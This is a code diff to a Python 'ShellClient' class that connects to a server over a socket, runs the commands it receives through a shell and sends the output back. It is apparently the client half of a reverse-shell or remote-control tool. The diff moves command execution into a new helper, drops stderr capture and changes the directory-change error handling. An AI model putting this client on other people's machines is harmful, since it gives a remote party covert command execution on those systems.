@@ -42,6 +42,25 @@ class ShellClient:
         # Send of the command data to the client
         sock.send(response_header + response)
 
+    def _exec_command(self, args):
+        """Execute a command on the client machine and send the output to the server"""
+        command = ' '.join(args)
+
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+
+        # Form the byte output
+        output = cmd.stdout.read()
+
+        # Convert this into a string
+        output = output.decode(self.ENCODING)
+        output = output + str(os.getcwd()) + '> '
+
+        # Print output for local testing
+        print(output)
+
+        # Send this response to the server
+        self._send_response(self.client_socket, output)
+
     def connect(self):
         try:
             self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -71,8 +90,9 @@ class ShellClient:
                     directory = args[1]
                     os.chdir(directory.strip())
 
-                except Exception as e:
-                    output = '[-]Could not change directory\n'
+                except Exception:
+                    print("[-]Could not change directory\n")
+                    continue
 
             elif args[0] == 'remove':
                 # Gracefully close the connection
@@ -84,23 +104,8 @@ class ShellClient:
                 continue
 
             if command_stream:
-                command = ' '.join(args)
-
-                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
-                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
-                # Form the byte output
-                output = cmd.stdout.read() + cmd.stderr.read()
-
-                # Convert this into a string
-                output = output.decode(self.ENCODING)
-                output = output + str(os.getcwd()) + '> '
-
-                # Print output for local testing
-                print(output)
-
-                # Send this response to the server
-                self._send_response(self.client_socket, output)
+                # Valid shell command was entered
+                self._exec_command(args)
 
     def disconnect(self):
         """Gracefully closes client connection to the server"""
